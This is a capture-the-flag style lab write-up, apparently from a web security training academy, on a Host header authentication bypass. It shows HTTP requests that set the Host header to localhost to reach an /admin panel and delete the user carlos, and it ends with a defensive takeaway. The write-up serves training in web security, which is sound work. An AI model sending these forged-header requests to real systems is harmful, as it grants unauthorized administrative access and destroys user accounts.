# Host Header Authentication Bypass


## Vulnerability Definition



**Host Header Authentication Bypass** occurs when an application relies on the HTTP `Host` header to determine a user's privilege level or 

whether a request originates from a trusted/local user.



Since the `Host` header can be manipulated by the client, an attacker may be able to make the application believe that the request 

originates from a trusted host such as `localhost`, resulting in unauthorized access to administrative functionality.



---



## Lab Goal



Access the admin panel and delete the user `carlos`.


---




## Exploitation



### 1. Test Host Header Manipulation



Send the homepage request to Burp Repeater:



```http

GET / HTTP/2

Host: <LAB-ID>.web-security-academy.net

```



Change the Host header to an arbitrary value:



```http

Host: anything

```



The request still succeeds.


**Observation:**



The application accepts arbitrary Host header values.



---



### 2. Discover the Admin Panel



Request:



```http

GET /robots.txt HTTP/2

Host: <LAB-ID>.web-security-academy.net

```



The response reveals:



```text

Disallow: /admin

```



Therefore, the admin panel is located at:



```text

/admin

```



---



### 3. Access `/admin`



Request:



```http

GET /admin HTTP/2

Host: <LAB-ID>.web-security-academy.net

```



Access is denied.



The error message reveals that the admin panel can only be accessed by **local users**.


This provides an important clue that the application may determine whether a user is local based on the request's Host header.



---



### 4. Bypass the Restriction



Send the `/admin` request to Burp Repeater and change:



```http

Host: <LAB-ID>.web-security-academy.net

```


to:



```http

Host: localhost

```



Final request:



```http

GET /admin HTTP/2

Host: localhost

```



The request now successfully accesses the admin panel.


### Why?



The application incorrectly trusts the Host header and treats:



```http
Host: localhost

```



as an indication that the request originates from a local user.



Therefore:



```text

Host: localhost

        ↓

Application assumes local user


        ↓
Admin access granted

```



---




### 5. Delete Carlos



Change the request line to:



```http

GET /admin/delete?username=carlos HTTP/2

Host: localhost

```



Send the request.



The user `carlos` is deleted and the lab is solved.


---



## Exploitation Flow



```text

GET /admin

Host: <LAB-DOMAIN>

        ↓

Access denied

        ↓

Error reveals "local users only"

        ↓

Change Host to localhost

        ↓

GET /admin

Host: localhost

        ↓

Admin access

        ↓

GET /admin/delete?username=carlos

        ↓

Lab solved


```



## Key Takeaway



Never rely on a user-controlled HTTP `Host` header to determine authentication or authorization privileges.


The `Host` header can be manipulated by an attacker and therefore should not be treated as proof that a request originates from a trusted 
or local user.
